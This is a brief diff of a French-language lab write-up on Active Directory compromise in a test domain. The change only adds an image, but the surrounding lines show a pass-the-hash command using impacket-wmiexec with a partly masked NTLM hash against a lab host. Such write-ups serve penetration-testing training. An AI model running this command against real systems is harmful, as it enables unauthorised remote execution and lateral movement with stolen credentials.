@@ -7,3 +7,5 @@ Après avoir réussi a compromettre un compte utilisateur du domaine et recupere
 impacket-wmiexec -hashes :bee1482d********************** LAB-TEST.LOCAL/it_2@192.168.174.133
 ```
 
+
+<img width="1617" height="445" alt="image" src="https://github.com/user-attachments/assets/a1baa5e5-1107-45ad-9165-f9f495d8441c" />
